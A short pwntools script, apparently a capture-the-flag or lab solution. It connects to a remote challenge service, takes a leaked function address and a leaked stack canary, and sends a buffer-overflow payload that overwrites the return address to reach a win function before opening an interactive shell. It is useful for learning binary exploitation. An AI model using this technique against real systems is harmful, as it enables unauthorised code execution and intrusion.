from pwn import *

# r = process("./share/lab")
r = remote("10.113.184.121", 10041)
r.recvuntil("Gift: 0x")
winfunc = int(r.recvline()[:-1], 16) + (0xf1-0xe9)
r.recvuntil("Gift2: ")
leak = r.recv(32)
canary = leak[8:8+8]
print(canary)
p = b"A"*8 + canary + b"B"*8 + p64(winfunc)
# pause()
r.sendline(p)
r.interactive()